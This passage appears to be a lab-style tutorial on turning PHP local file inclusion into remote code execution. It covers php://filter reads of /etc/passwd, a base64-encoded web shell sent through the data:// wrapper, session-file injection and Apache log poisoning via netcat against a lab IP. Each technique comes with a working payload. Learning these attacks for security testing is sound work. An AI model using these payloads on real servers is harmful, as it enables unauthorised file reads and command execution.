#### PHP Wrappers
PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
```php
php://filter/convert.base64-encode/resource=/etc/passwd
```
Once the application processes this payload, the server will return an encoded content of the passwd file. Then decode the base64 encoded data. PHP wrappers can also be used not only for reading files but also for ```code execution```. We will use the PHP code ```<?php system($_GET['cmd']); echo 'Shell done!'; ?>``` as our payload and ```PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+``` is the encoded base64 format of the PHP code. The full value of the payload, when encoded to base64, will be 
```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```
After sending the payload add ```&cmd=whoami``` after the ```+``` sign. Not before, because it is important to not include the &cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you an invalid byte sequence error.
#### Data Wrappers
The data stream wrapper is another example of PHP's wrapper functionality. The ```data://``` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code.
```txt
data:text/plain,<?php%20phpinfo();%20?>
```
This Payload could cause PHP code execution, displaying the PHP configuration details.
#### PHP Session Files
PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.
##### Exploitation
An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using ```<?php echo phpinfo(); ?>``` in the page parameter.
```
<?php echo phpinfo(); ?>
```
This code is then saved in the session file on the server. Subsequently, the attacker can use the LFI vulnerability to include this session file. Since session IDs are hashed, the ID can be found in the cookies section of your browser. Accessing the Path ```/var/lib/php/sessions/sess_[sessionID]``` will execute the injected PHP code in the session file. Note that you have to replace ```[sessionID]``` with the value from your PHPSESSID cookie.
#### Log Poisoning
Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.
##### Exploitation:
Start nc on target server.
```
nc 10.10.173.214 80             
```
Now inject the php code and send. The code will then be logged in the server's access logs.
```        
<?php echo phpinfo(); ?>
```
The attacker then uses LFI to include the access log file: ```/var/log/apache2/access.log```
